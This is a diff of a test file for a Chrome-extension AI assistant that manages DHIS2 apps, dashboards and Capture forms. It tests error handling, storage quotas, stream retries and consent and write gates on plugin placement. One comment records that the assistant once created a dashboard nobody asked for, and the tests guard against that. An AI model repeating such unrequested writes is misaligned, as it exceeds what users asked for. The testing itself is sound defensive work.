+  // (every DELETE) passed `undefined` and Chrome rejected the injection.
+  const savedTabs = chrome.tabs.query, savedScripting = chrome.scripting.executeScript;
+  let injectedArgs = null;
+  chrome.tabs.query = () => Promise.resolve([{ id: 7, url: 'http://localhost:8081/apps/dashboard' }]);
+  chrome.scripting.executeScript = (inj) => { injectedArgs = inj.args; return Promise.resolve([{ result: { ok: true, status: 204, statusText: 'No Content', text: '' } }]); };
+  const viaTab = await ctx.fetchViaTab('http://localhost:8081/api/42/apps/ai-verify-app', 'DELETE', {}, undefined);
+  truthy('fetchViaTab sends null (not undefined) as the body of a body-less write', injectedArgs && injectedArgs.length === 4 && injectedArgs[3] === null && viaTab && viaTab.status === 204);
+  chrome.tabs.query = savedTabs;
+  chrome.scripting.executeScript = savedScripting;
+
+  // A 409 from a direct DELETE (ObjectReport) keeps its reasons.
+  ctx.fetch = () => Promise.resolve({ ok: false, status: 409, statusText: 'Conflict', type: 'basic', text: async () => JSON.stringify({ httpStatus: 'Conflict', httpStatusCode: 409, status: 'ERROR', message: 'Could not delete', response: { responseType: 'ObjectReport', errorReports: [{ message: 'Object could not be deleted because it is associated with another object: Event', errorCode: 'E4030' }] } }) });
+  const del409 = await ctx.__realSafeDhis2Fetch('dataElements/a3kGcGpz8FJ', { method: 'DELETE' });
+  truthy('DELETE 409 (ObjectReport) surfaces errorReports + the soft-deleted-event hint', (del409.error_details || []).some((m) => /associated with another object: Event/.test(m)) && /softDeletedEventRemoval/.test(del409._hint || ''));
+
+  // Chrome answers a write from the extension origin with an empty 200 and
+  // DHIS2 installs nothing: uploadAppZip must not call that a success.
+  ctx.fetch = () => Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => '' });
+  const emptyUp = await ctx.uploadAppZip(new Uint8Array([1, 2, 3]), 'ai-verify-app.zip');
+  truthy('an empty 2xx upload response is "NOT installed" with an open-a-DHIS2-tab hint', /NOT installed/.test(emptyUp._error || '') && /DHIS2 tab/.test(emptyUp._hint || ''));
+
+  // Registry wiring + intent routing.
+  truthy('manage_custom_app is routed, write-capable, manual-gated, summarised, with a manual',
+    ctx.__TOOL_ROUTER.manage_custom_app === true && ctx.WRITE_CAPABLE_TOOL_NAMES.has('manage_custom_app') && ctx.MANUAL_TOOLS.has('manage_custom_app')
+    && typeof ctx.TOOL_SUMMARIES.manage_custom_app === 'string' && /getPropsFromParent/.test(ctx.MANUAL_EXTRAS.manage_custom_app || ''));
+  const intent = ctx.detectCustomAppIntent;
+  for (const t of ['Build a dashboard widget that shows ANC coverage by district', 'make an app that lists programs with their stage counts', 'create a plugin for the dashboard', 'update ai-kpi-plugin to show 4 cards', 'roll back my custom app'])
+    truthy(`intent: "${t}" → manage_custom_app`, intent(t.toLowerCase()));
+  for (const t of ['in the capture app create a program for tb', 'install the growth chart plugin', 'create a program indicator for anc visits', 'open the dashboard app'])
+    truthy(`no intent: "${t}"`, !intent(t.toLowerCase()));
+  const names = (txt) => ctx.getContextualTools({ appType: 'Dashboard' }, txt).map((x) => x.function.name);
+  truthy('getContextualTools offers manage_custom_app for a widget request', names('Build a dashboard widget that shows ANC coverage').includes('manage_custom_app'));
+  truthy('…and not for an ordinary indicator request', !names('create a program indicator for anc visits').includes('manage_custom_app'));
+
+  d.baseUrl = saved.baseUrl; d.apiVersion = saved.apiVersion; d.writeAuth = saved.writeAuth;
+  ctx.fetch = saved.fetch; ctx.safeDhis2Fetch = saved.sdf;
+}
+
+// ── Chat history must survive an over-quota state (live 2026-10-22) ─────────
+// On a big program's Capture page programMetadata was 6.1 MB; saveState wrote
+// it in the SAME set() as chatHistory, Chrome rejected the whole write
+// ("Session storage quota bytes exceeded"), the catch swallowed it, and after
+// the idle worker was evicted the next message ("yes install it") ran with no
+// history at all.
+async function runStatePersistenceChecks() {
+  console.log('\nState persistence (session quota):');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const d = ctx.__dhis2();
+  const realSession = chrome.storage.session;
+  const saved = {};
+  const QUOTA = 1_000_000; // stand-in for Chrome's 10 MB: any single value over it is rejected
+  chrome.storage.session = {
+    get: () => Promise.resolve({}),
+    remove: () => Promise.resolve(),
+    set: (obj) => {
+      if (JSON.stringify(obj).length > QUOTA) return Promise.reject(new Error('Session storage quota bytes exceeded. Values were not stored.'));
+      Object.assign(saved, JSON.parse(JSON.stringify(obj)));
+      return Promise.resolve();
+    },
+  };
+  const prevMeta = d.programMetadata;
+  try {
+    const drugs = Array.from({ length: 4000 }, (_, i) => ({ id: `opt${i}`, code: `DRUG_${i}`, displayName: `Drug number ${i} 500 mg tablet` }));
+    d.programMetadata = { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programStages: [{ id: 'pHbLWI4CaxD', programStageDataElements: Array.from({ length: 15 }, () => ({ dataElement: { optionSet: { options: drugs } } })) }] };
+    vm.runInContext(`conversationHistory = [
+      { role: 'user', content: 'create a plugin' },
+      { role: 'assistant', content: null, tool_calls: [{ id: 'c1', type: 'function', function: { name: 'manage_custom_app', arguments: '{"action":"preview"}' } }] },
+      { role: 'tool', tool_call_id: 'c1', content: '{"preview":true,"preview_token":"pv-0123456789abcdef"}' },
+      { role: 'assistant', content: 'Shall I install it?' },
+    ];`, ctx);
+    await ctx.saveState();
+    truthy('chatHistory is persisted even when the program cache is over the quota', Array.isArray(saved.chatHistory) && saved.chatHistory.length === 4 && /pv-0123456789abcdef/.test(JSON.stringify(saved.chatHistory)));
+    truthy('the oversized programMetadata is left out of dhis2Full (re-fetched after a restart)', saved.dhis2Full && !saved.dhis2Full.programMetadata && saved.dhis2Full.baseUrl === d.baseUrl);
+    d.programMetadata = { id: 'small1', displayName: 'Small program', programStages: [] };
+    await ctx.saveState();
+    truthy('a normal-size programMetadata is still persisted', saved.dhis2Full && saved.dhis2Full.programMetadata && saved.dhis2Full.programMetadata.id === 'small1');
+    // A history that alone is over the quota keeps its most recent turns.
+    const big = 'x'.repeat(200_000);
+    vm.runInContext(`conversationHistory = ${JSON.stringify(Array.from({ length: 6 }, (_, i) => [{ role: 'user', content: `turn ${i} ${big}` }, { role: 'assistant', content: `answer ${i}` }]).flat())};`, ctx);
+    await ctx.saveState();
+    truthy('an over-quota history is halved until it fits, newest turns kept', Array.isArray(saved.chatHistory) && saved.chatHistory.length > 0 && saved.chatHistory.length < 12 && saved.chatHistory[saved.chatHistory.length - 1].content === 'answer 5' && saved.chatHistory[0].role === 'user');
+  } finally {
+    chrome.storage.session = realSession;
+    d.programMetadata = prevMeta;
+    vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);
+  }
+  const agentSrc = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
+  const chatHandler = agentSrc.slice(agentSrc.indexOf("case 'CHAT_MESSAGE'"), agentSrc.indexOf("case 'CHAT_MESSAGE'") + 3000);
+  truthy('CHAT_MESSAGE waits for the state restore before the turn reads the history', /await stateRestored;[\s\S]{0,40}await ensureConnected\(\)/.test(chatHandler));
+  truthy('CHAT_MESSAGE re-fetches a programMetadata that was not persisted', /freshCtx\.programId && !dhis2\.programMetadata/.test(chatHandler));
+}
+
+// ── Plugin placement (manage_custom_app place / unplace / placements) ────────
+// Formats verified 2026-10-22 against the Capture 106.2.2 bundle and the
+// Tracker Plugin Configurator's saved configs on 2.42.5.1. The server here is
+// an in-memory stand-in: a place → unplace round trip must leave every key
+// byte-identical (after jsonb key reordering) to where it started.
+async function runPlacementChecks() {
+  console.log('\nPlugin placement (dashboards · Capture pages · Capture forms):');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
+  const d = ctx.__dhis2();
+  const saved = { baseUrl: d.baseUrl, writeAuth: d.writeAuth, sdf: ctx.safeDhis2Fetch, src: ctx.loadCustomAppSource, tavily: vm.runInContext('_hasTavilyKey', ctx) };
+
+  // Tavily: browse_dhis2_docs only exists when a key is saved.
+  const arch = vm.runInContext('TOOLS', ctx).find((t) => t.function.name === 'architect_metadata');
+  vm.runInContext('_hasTavilyKey = false;', ctx);
+  const stripped = ctx.stripUnavailableToolActions([arch])[0].function;
+  truthy('no Tavily key: browse_dhis2_docs is not offered (enum, docs_query, description)', !stripped.parameters.properties.action.enum.includes('browse_dhis2_docs') && !stripped.parameters.properties.docs_query && !/browse_dhis2_docs/.test(stripped.description));
+  truthy('…and the original tool definition is left untouched', arch.function.parameters.properties.action.enum.includes('browse_dhis2_docs'));
+  vm.runInContext('_hasTavilyKey = true;', ctx);
+  truthy('with a Tavily key: browse_dhis2_docs is offered', ctx.stripUnavailableToolActions([arch])[0].function.parameters.properties.action.enum.includes('browse_dhis2_docs'));
+  vm.runInContext(`_hasTavilyKey = ${saved.tavily};`, ctx);
+
+  // Pure helpers.
+  const KEY = 'ai-test-meds';
+  const SRC = `http://localhost:8081/api/apps/${KEY}/plugin.html`;
+  truthy('isPluginSourceOf: ai-test-meds never matches ai-test-meds-2', ctx.isPluginSourceOf(KEY, SRC) && !ctx.isPluginSourceOf(KEY, 'http://x/api/apps/ai-test-meds-2/plugin.html') && ctx.isPluginSourceOf(KEY, `/api/apps/${KEY}/plugin.html`));
+  truthy('canonicalJson ignores object key order (jsonb reorders keys)', ctx.canonicalJson({ b: 1, a: [{ y: 2, x: 1 }] }) === ctx.canonicalJson({ a: [{ x: 1, y: 2 }], b: 1 }));
+  const def = ctx.captureDefaultLayout('enrollmentOverviewLayout');
+  eq('enrollment dashboard default = Capture 106 bundle default', [def.leftColumn.map((w) => w.name), def.rightColumn.map((w) => w.name)], [['StagesAndEvents'], ['QuickActions', 'ErrorWidget', 'WarningWidget', 'EnrollmentNote', 'FeedbackWidget', 'IndicatorWidget', 'TrackedEntityRelationship', 'ProfileWidget', 'EnrollmentWidget']]);
+  const placed = ctx.layoutWithPlugin(def, KEY, SRC, 'right', 'top');
+  truthy('layoutWithPlugin puts { type:"plugin", source } at the top of the right column', placed.layout.rightColumn[0].type === 'plugin' && placed.layout.rightColumn[0].source === SRC && placed.layout.rightColumn.length === 10);
+  truthy('placing twice is a no-op (already placed)', ctx.layoutWithPlugin(placed.layout, KEY, SRC, 'left', 'bottom').already === true);
+  const back = ctx.layoutWithoutPlugin(placed.layout, KEY);
+  truthy('layoutWithoutPlugin removes it and the result is Capture\'s default again', back.removed === 1 && ctx.isDefaultCaptureLayout(back.layout, 'enrollmentOverviewLayout'));
+
+  const stageCtx = {
+    id: 'pHbLWI4CaxD', kind: 'program_stage', name: 'Visit', programId: 'vj5cpA2OOfZ', programName: 'Pharmacy', customForm: false,
+    fieldIds: ['deWeight001', 'deHeight001', 'deBmi000001', 'deNote00001'],
+    fields: { deWeight001: { id: 'deWeight001', displayName: 'Weight' }, deHeight001: { id: 'deHeight001', displayName: 'Height' }, deBmi000001: { id: 'deBmi000001', displayName: 'BMI' }, deNote00001: { id: 'deNote00001', displayName: 'Note' } },
+    sections: [{ id: 'secBody0001', name: 'Body', fieldIds: ['deWeight001', 'deHeight001', 'deBmi000001'] }, { id: 'secNote0001', name: 'Notes', fieldIds: ['deNote00001'] }],
+  };
+  const dflt = ctx.defaultCaptureFormConfig(stageCtx);
+  eq('default form config mirrors the stage sections (Configurator format)', dflt, [{ id: 'secBody0001', name: 'Body', elements: [{ id: 'deWeight001', type: 'TrackedEntityAttribute' }, { id: 'deHeight001', type: 'TrackedEntityAttribute' }, { id: 'deBmi000001', type: 'TrackedEntityAttribute' }] }, { id: 'secNote0001', name: 'Notes', elements: [{ id: 'deNote00001', type: 'TrackedEntityAttribute' }] }]);
+  truthy('a stage without sections gets one untitled section with every field', (() => { const c = ctx.defaultCaptureFormConfig({ ...stageCtx, sections: [] }); return c.length === 1 && !c[0].name && c[0].elements.length === 4; })());
+  eq('a stage with a custom HTML form gets only the plugin section', ctx.defaultCaptureFormConfig({ ...stageCtx, customForm: true }), []);
+  const fm = [{ plugin_field: 'weight', field_id: 'deWeight001' }, { plugin_field: 'height', field_id: 'deHeight001' }, { plugin_field: 'bmi', field_id: 'deBmi000001', replace_field: true }];
+  const inBody = ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm, section: 'body', sectionName: null, position: 'bottom' });
+  const bodyEls = inBody.sections[0].elements;
+  truthy('form plugin goes into the named section with the Configurator\'s fieldMap shape', bodyEls[bodyEls.length - 1].type === 'plugin' && bodyEls[bodyEls.length - 1].pluginSource === SRC
+    && JSON.stringify(bodyEls[bodyEls.length - 1].fieldMap[0]) === JSON.stringify({ IdFromApp: 'deWeight001', IdFromPlugin: 'weight', objectType: 'TrackedEntityAttribute' }));
+  truthy('replace_field takes the field out of the form; kept fields stay', !bodyEls.some((e) => e.id === 'deBmi000001') && bodyEls.some((e) => e.id === 'deWeight001'));
+  const undone = ctx.formWithoutPlugin(inBody.sections, KEY);
+  truthy('removing the plugin puts the replaced field back where the plugin was → default form again', undone.removed === 1 && ctx.canonicalJson(undone.sections) === ctx.canonicalJson(dflt));
+  const own = ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm.slice(0, 2), section: null, sectionName: 'Calculator', position: 'top' });
+  truthy('without section the plugin gets its own section (top), removed again with it', own.sections[0].name === 'Calculator' && own.sections[0].elements[0].type === 'plugin'
+    && ctx.canonicalJson(ctx.formWithoutPlugin(own.sections, KEY).sections) === ctx.canonicalJson(dflt));
+  truthy('placing in the same form twice keeps ONE plugin element (upsert)', ctx.formPluginElements(ctx.formWithPlugin(inBody.sections, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm, section: 'Body', position: 'top' }).sections, KEY).length === 1);
+  truthy('an unknown section is refused with the section list', /No section "Vitals"/.test(ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'x', source: SRC, fieldMap: fm, section: 'Vitals', position: 'top' })._error || ''));
+  const code = "setFieldValue({ fieldId: 'bmi', value: x }); const w = values.weight; const t = values['temp'];";
+  const al = ctx.pluginFieldAliasProblems(code, [{ plugin_field: 'weight' }, { plugin_field: 'height' }]);
+  truthy('writing an unmapped alias is an error; reading one is a warning', al.errors.some((e) => /writes "bmi"/.test(e)) && al.warnings.some((w) => /values\.temp/.test(w)) && al.warnings.some((w) => /"height" is mapped but/.test(w)));
+  truthy('field_map: a field outside the stage is refused', /not a data element of stage/.test((ctx.fieldMapProblem([{ plugin_field: 'x', field_id: 'zzzzzzzzzzz' }], stageCtx) || {})._error || ''));
+  truthy('field_map: an alias mapped twice is refused', /mapped twice/.test((ctx.fieldMapProblem([{ plugin_field: 'x', field_id: 'deWeight001' }, { plugin_field: 'x', field_id: 'deHeight001' }], stageCtx) || {})._error || ''));
+
+  // Round trips against an in-memory DHIS2.
+  const server = {
+    datastore: {
+      capture: {
+        enrollmentOverviewLayout: { OtherProg01: { leftColumn: [{ type: 'component', name: 'StagesAndEvents' }], rightColumn: [{ type: 'plugin', source: '/api/apps/someone-else/plugin.html' }] } },
+        dataEntryForms: { otherStage1: [{ id: 's1', elements: [{ id: 'x1', type: 'TrackedEntityAttribute' }] }] },
+      },
+      'dhis2-ai-extension-backups': {},
+    },
+    dashboards: { dash0000001: { id: 'dash0000001', name: 'Ops', dashboardItems: [] } },
+  };
+  const original = JSON.parse(JSON.stringify(server.datastore.capture));
+  const calls = [];
+  ctx.safeDhis2Fetch = async (p, o = {}) => {
+    const method = o.method || 'GET';
+    calls.push(`${method} ${p.split('?')[0]}`);
+    if (p === 'apps') return [{ key: KEY, name: 'Medication widget', displayName: 'Medication widget', version: '1.0.0', developer: { company: 'dhis2-ai-assistant' }, pluginLaunchUrl: SRC, plugin_type: 'CAPTURE', appState: 'OK' }, { key: 'ai-test-dash', name: 'Dash', developer: { company: 'dhis2-ai-assistant' }, pluginLaunchUrl: 'http://localhost:8081/api/apps/ai-test-dash/plugin.html', plugin_type: 'DASHBOARD' }];
+    if (p === 'dataStore') return Object.keys(server.datastore);
+    let m = p.match(/^dataStore\/([^/?]+)(?:\/([^?]+))?/);
+    if (m) {
+      const ns = decodeURIComponent(m[1]); const k = m[2] && decodeURIComponent(m[2]);
+      const space = server.datastore[ns] || (server.datastore[ns] = {});
+      if (!k) return Object.keys(space);
+      if (method === 'GET') return k in space ? JSON.parse(JSON.stringify(space[k])) : { _error: 'HTTP 404', _status: 404 };
+      if (method === 'POST') { if (k in space) return { _error: 'HTTP 409', _status: 409 }; space[k] = JSON.parse(JSON.stringify(o.body)); return { httpStatus: 'Created' }; }
+      if (method === 'PUT') { if (!(k in space)) return { _error: 'HTTP 404', _status: 404 }; space[k] = JSON.parse(JSON.stringify(o.body)); return {}; }
+      if (method === 'DELETE') { delete space[k]; return {}; }
+    }
+    if (p.startsWith('programs/vj5cpA2OOfZ')) return { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programType: 'WITH_REGISTRATION', programTrackedEntityAttributes: [], programSections: [] };
+    if (p.startsWith('programs/eventProg01')) return { id: 'eventProg01', displayName: 'Lab', programType: 'WITHOUT_REGISTRATION' };
+    if (p.startsWith('programStages?filter=id:eq:pHbLWI4CaxD')) return { programStages: [{ id: 'pHbLWI4CaxD' }] };
+    if (p.startsWith('programStages?filter=')) return { programStages: [] };
+    if (p.startsWith('programStages/pHbLWI4CaxD')) return { id: 'pHbLWI4CaxD', displayName: 'Visit', formType: 'SECTION', program: { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programType: 'WITH_REGISTRATION' },
+      programStageDataElements: stageCtx.fieldIds.map((id) => ({ dataElement: { id, displayName: stageCtx.fields[id].displayName, valueType: 'NUMBER' } })),
+      programStageSections: [{ id: 'secBody0001', displayName: 'Body', sortOrder: 1, dataElements: [{ id: 'deWeight001' }, { id: 'deHeight001' }, { id: 'deBmi000001' }] }, { id: 'secNote0001', displayName: 'Notes', sortOrder: 2, dataElements: [{ id: 'deNote00001' }] }] };
+    if (p.startsWith('dashboards?filter=')) return { dashboards: [] };
+    return { _error: `unexpected ${method} ${p}` };
+  };
+  ctx.loadCustomAppSource = async () => ({ aiManifest: { version: '1.0.0' }, sources: { 'plugin.jsx': "const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'bmi', value: values.weight / values.height }); };" } });
+  d.baseUrl = 'http://localhost:8081';
+  // Placement needs to have been asked for (live 2026-10-22: the model created
+  // a dashboard nobody asked for after "yes, install it").
+  const asked = ctx.userAskedToPlace;
+  for (const t of ['Create a dashboard plugin … and add it to a new dashboard called "ai-test LLM malaria".', 'lists them as a widget on the enrollment dashboard', 'Please create and install and enrollment plugin here that lists them as a widget here', 'Add a plugin to this Initial Assessment form that reads the weight', 'yes, place it'])
+    truthy(`placement asked: "${t.slice(0, 60)}"`, asked([t]));
+  for (const t of ['Build a dashboard widget that shows the number of enrollments per org unit for the selected period. Show me a preview first.', 'yes, install it', 'make an app that lists programs'])
+    truthy(`no placement asked: "${t.slice(0, 60)}"`, !asked([t]));
+  d.writeAuth = { scope: 'broad', reason: 'verify' };
+  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [{ role: "user", content: "Build a dashboard widget that shows enrollments. Show me a preview first." }, { role: "assistant", content: "Preview passed. Shall I install it?" }];', ctx);
+  truthy('place is refused when nobody asked for a placement (nothing written)', /has not asked for this plugin to be put/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' }))._error || '') && !server.datastore.capture.enrollmentOverviewLayout.vj5cpA2OOfZ);
+  vm.runInContext('lastUserText = "yes please"; conversationHistory = [{ role: "user", content: "build a medication widget" }, { role: "assistant", content: "Installed. Should I add it to the Pharmacy enrollment dashboard?" }];', ctx);
+  truthy('…allowed when the user says yes to the assistant\'s placement question', vm.runInContext('placementWasRequested()', ctx) === true);
+  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [{ role: "user", content: "Build a dashboard widget that shows enrollments" }, { role: "assistant", content: "The dashboard widget compiled. Shall I install it?" }];', ctx);
+  truthy('…but "yes" to "install this dashboard widget?" is not a placement', vm.runInContext('placementWasRequested()', ctx) === false);
+  vm.runInContext('lastUserText = "add it to the enrollment dashboard of Pharmacy"; conversationHistory = [];', ctx);
+  d.writeAuth = { scope: 'read_only', reason: 'verify' };
+  const refused = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' });
+  truthy('place is refused on a read-only turn (write gate)', /Refused/.test(refused._error || '') && !server.datastore.capture.enrollmentOverviewLayout.vj5cpA2OOfZ);
+  d.writeAuth = { scope: 'broad', reason: 'verify' };
+  const p1 = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' });
+  const lay = server.datastore.capture.enrollmentOverviewLayout;
+  truthy('place enrollment_dashboard: Capture default + plugin written for that program only', p1.success === true && p1.started_from_capture_default === true
+    && lay.vj5cpA2OOfZ.rightColumn[0].source === SRC && lay.vj5cpA2OOfZ.rightColumn.length === 10 && ctx.canonicalJson(lay.OtherProg01) === ctx.canonicalJson(original.enrollmentOverviewLayout.OtherProg01));
+  const bk = server.datastore['dhis2-ai-extension-backups'][p1.backup.key];
+  truthy('…the previous value was backed up first (manage_backups can restore it)', bk && bk.capture_config && bk.capture_config.key === 'enrollmentOverviewLayout' && ctx.canonicalJson(bk.capture_config.value) === ctx.canonicalJson(original.enrollmentOverviewLayout));
+  truthy('an event program is refused for enrollment pages', /event program/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'eventProg01' }))._error || ''));
+  truthy('a CAPTURE plugin is refused on a dashboard', /only DASHBOARD plugins/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'dashboard', dashboard_id: 'dash0000001' }))._error || ''));
+  truthy('place refuses an unmapped setFieldValue alias', /writes "bmi"/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'form', program_stage_id: 'pHbLWI4CaxD', field_map: [{ plugin_field: 'weight', field_id: 'deWeight001' }, { plugin_field: 'height', field_id: 'deHeight001' }] }))._error || ''));
+  const p2 = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'form', program_stage_id: 'pHbLWI4CaxD', section: 'Body', field_map: fm });
+  const form = server.datastore.capture.dataEntryForms.pHbLWI4CaxD;
+  truthy('place form: the stage form is written from its sections + the plugin with the field map', p2.success === true && form.length === 2 && ctx.formPluginElements(form, KEY).length === 1 && ctx.canonicalJson(server.datastore.capture.dataEntryForms.otherStage1) === ctx.canonicalJson(original.dataEntryForms.otherStage1));
+  const pl = await ctx.executeManageCustomApp({ action: 'placements', key: KEY });
+  truthy('placements lists the enrollment page and the form', pl.total === 2 && pl.capture_pages[0].program_id === 'vj5cpA2OOfZ' && pl.forms[0].context_id === 'pHbLWI4CaxD' && pl.forms[0].field_map.length === 3);
+  truthy('placements is a discovery (read-only) action', ctx.isDiscoveryCall('manage_custom_app', { action: 'placements' }) && !ctx.isDiscoveryCall('manage_custom_app', { action: 'place' }));
+  const un = await ctx.executeManageCustomApp({ action: 'unplace', key: KEY });
+  truthy('unplace removes it everywhere and drops the entries it created', un.success === true && un.removed.length === 2 && un.removed.every((r) => r.entry_removed === true));
+  truthy('after unplace dataStore/capture is exactly as it was before (jsonb-equal)', ctx.canonicalJson(server.datastore.capture) === ctx.canonicalJson(original));
+  const restore = await ctx.restoreFromBackup(p1.backup.key);
+  truthy('manage_backups restore of a Capture backup rewrites the old value', restore.success === true && ctx.canonicalJson(server.datastore.capture.enrollmentOverviewLayout) === ctx.canonicalJson(original.enrollmentOverviewLayout));
+
+  // Dashboard APP items.
+  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [];', ctx);
+  truthy('manage_dashboards refuses an APP item nobody asked to place (no route around place)', /not asked for this plugin to be put on a dashboard/.test((await ctx.checkDashboardAppItem('ai-test-dash'))._error || ''));
+  vm.runInContext('lastUserText = "put the KPI plugin on the Ops dashboard";', ctx);
+  const chk = await ctx.checkDashboardAppItem('ai-test-dash');
+  truthy('a DASHBOARD plugin is a valid dashboard APP item', !!chk.app && !chk._error);
+  truthy('a CAPTURE plugin is not', /not a dashboard plugin/.test((await ctx.checkDashboardAppItem(KEY))._error || ''));
+  truthy('an app that is not installed is not', /No app with key/.test((await ctx.checkDashboardAppItem('ai-nope'))._error || ''));
+
+  d.baseUrl = saved.baseUrl; d.writeAuth = saved.writeAuth;
+  ctx.safeDhis2Fetch = saved.sdf; ctx.loadCustomAppSource = saved.src;
+  vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);
+}
+
+// ── A provider connection dropped mid-stream (Fireworks, live 2026-10-22) ────
+// read() rejects, the handler called reader.cancel(), and cancel() on an
+// errored stream returns a promise rejected with the same error — unhandled.
+// Chrome logs it as an uncaught error; Node kills the process (it took the
+// visual suite down before its cleanup ran).
+async function runStreamDropChecks() {
+  console.log('\nLLM stream dropped mid-response:');
+  const unhandled = [];
+  const onUnhandled = (e) => unhandled.push(String(e && e.message || e));
+  process.on('unhandledRejection', onUnhandled);
+  const savedFetch = ctx.fetch;
+  try {
+    vm.runInContext(`_cachedApiKey = 'verify-key'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
+    for (const flavour of ['openai', 'anthropic']) {
+      ctx.fetch = async () => new Response(new ReadableStream({
+        start(c) {
+          c.enqueue(new TextEncoder().encode(flavour === 'openai'
+            ? 'data: {"choices":[{"index":0,"delta":{"content":"Hel"}}]}\n\n'
+            : 'event: message_start\ndata: {"type":"message_start","message":{"id":"x","content":[]}}\n\n'));
+          setTimeout(() => c.error(new TypeError('terminated')), 5);
+        },
+      }), { status: 200, headers: { 'Content-Type': 'text/event-stream' } });
+      if (flavour === 'anthropic') vm.runInContext(`_cachedProviderConfig = { ..._cachedProviderConfig, providerType: 'anthropic', apiBaseUrl: 'https://llm.invalid' };`, ctx);
+      let err = null;
+      try { await ctx.callProviderStreaming([{ role: 'user', content: 'hi' }], false, () => {}, [], 0); } catch (e) { err = e; }
+      await new Promise((r) => setTimeout(r, 30));
+      if (err && /terminated/.test(err.message) && !unhandled.length) ok(`${flavour}: the turn fails with the network error and nothing is left unhandled`);
+      else bad(`${flavour}: err=${err && err.message} unhandled=${JSON.stringify(unhandled)}`);
+      unhandled.length = 0;
+    }
+  } finally {
+    ctx.fetch = savedFetch;
+    vm.runInContext(`_cachedApiKey = null; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG };`, ctx);
+    process.off('unhandledRejection', onUnhandled);
+  }
+}
+
+// A dropped provider stream is retried like a stalled one (no text yet).
+function runStreamRetryChecks() {
+  console.log('\nProvider stream drops are retried before any text streams:');
+  const r = ctx.isRetryableStreamDrop;
+  for (const m of ['LLM stream stalled: no data from x for 60s', 'terminated', 'TypeError: network error', 'Failed to fetch', 'other side closed'])
+    (r(new Error(m)) ? ok : bad)(`retryable: "${m}"`);
+  for (const m of ['HTTP 401 Unauthorized', 'No API key configured', 'Invalid provider URL'])
+    (!r(new Error(m)) ? ok : bad)(`not retryable: "${m}"`);
+  const src = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
+  (/isRetryableStreamDrop\(provErr\) && !streamStartBroadcast/.test(src) ? ok : bad)('the agent loop retries only while nothing has streamed to the panel');
+}
+
 // setImmediate: a few checks are async (promise-returning safety gates); they
 // resolve on the microtask queue, so the verdict must run after it drains.
-setImmediate(() => {
+setImmediate(async () => {
+  if (loaded) await runStreamDropChecks().catch((e) => bad(`stream-drop checks threw: ${e && e.stack || e}`));
+  if (loaded) { try { runStreamRetryChecks(); } catch (e) { bad(`stream-retry checks threw: ${e && e.stack || e}`); } }
+  if (loaded) await runStatePersistenceChecks().catch((e) => bad(`state persistence checks threw: ${e && e.stack || e}`));
+  if (loaded) await runPlacementChecks().catch((e) => bad(`placement checks threw: ${e && e.stack || e}`));
+  if (loaded) await runCustomAppChecks().catch((e) => bad(`custom-app checks threw: ${e && e.stack || e}`));
   console.log('');
   if (loaded && !screenshotChecksDone) bad('screenshot checks never finished — a SCREENSHOT_* handler did not answer');
   if (loaded && !hardeningChecksDone) bad('hardening checks never finished — a handler did not answer');
